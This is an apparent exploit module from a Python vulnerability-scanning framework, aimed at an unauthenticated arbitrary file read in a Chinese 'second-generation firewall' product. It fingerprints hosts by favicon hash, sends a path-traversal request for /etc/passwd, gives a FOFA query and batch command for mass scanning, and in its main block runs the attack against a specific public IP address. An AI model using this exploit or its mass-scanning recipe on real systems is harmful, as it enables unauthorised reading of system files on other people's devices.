# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugLevel, BugType
from core.request.asynchttp import *


# fofa: app="利谱第二代防火墙系统"
# python batch.py -m exploit.scripts.Vpn.TIPTOP.unauth_readfile -cs -fs "app=\"利谱第二代防火墙系统\""

class Script(BaseScript):
    name = 'TIPTOP'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.READFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/webui/images/default/default/alert_close.jpg']
        # exec
        self.exec_path_list = ['/download.php?&class=vpn&toolname =../../../../../../../../../../etc/passwd']
        # 相关信息
        self.info = '利谱第二代防火墙任意文件读取'
        # favicon
        self.favicon_md5_list = ['a44d8cdc59b0ada550028da6ab550fd3']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                favicon_md5 = await AsyncFetcher.get_favicon_md5_fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if favicon_md5 in self.favicon_md5_list:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, timeout=self.req_timeout, allow_redirects=False)
                if 'root:x' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    asyncio.get_event_loop().run_until_complete(Script('https://80.151.174.31').attack())

    # import requests
    # import hashlib
    #
    # resp = requests.get('https://80.151.174.31/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    # m1.update(resp.content)
    # theMD5 = m1.hexdigest()
    # print(theMD5)
